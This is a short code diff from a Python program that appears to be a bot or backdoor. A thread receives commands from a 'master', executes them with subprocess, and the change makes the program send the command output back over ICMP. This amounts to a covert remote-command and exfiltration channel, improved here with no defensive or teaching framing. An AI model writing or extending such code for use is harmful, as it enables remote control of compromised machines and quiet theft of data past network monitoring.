@@ -53,7 +53,7 @@ class Handler(threading.Thread):
 				print("RECEIVED: "+cmd)
 				out = subprocess.check_output(cmd.split())
 				print("OUT: "+str(out))
-				send_icmp(localhost, self.master, "OUTPUT")
+				send_icmp(localhost, self.master, "OUTPUT"+out)
 
 def init():
 	print("Bot started...["+localhost+"]")
